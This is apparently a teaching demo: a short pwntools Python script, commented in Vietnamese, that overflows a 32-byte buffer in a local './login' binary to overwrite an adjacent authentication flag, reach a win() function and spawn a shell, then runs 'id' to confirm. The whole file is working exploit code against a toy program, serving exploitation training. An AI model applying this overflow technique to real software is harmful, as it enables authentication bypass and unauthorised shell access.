#!/usr/bin/env python3
# Demo 3.1: tran gets de ghi de bien authed trong struct -> win() -> shell.
# authed nam ngay sau buf[32] trong struct => offset = 32 (bao dam boi layout struct).
from pwn import *

context.binary = ELF('./login', checksec=False)
context.log_level = 'info'

io = process('./login')
payload = b'A' * 32 + b'B' * 4          # 32 dem + 4 byte bat ky (khac 0) de authed
io.sendlineafter(b'dang nhap: ', payload)
# cho banner win() in ra (xac nhan shell da spawn) roi moi gui lenh, tranh race
io.sendlineafter(b'thanh cong!\n', b'echo ===SHELL_OK===; id; exit')
print(io.recvall(timeout=3).decode(errors='replace'))
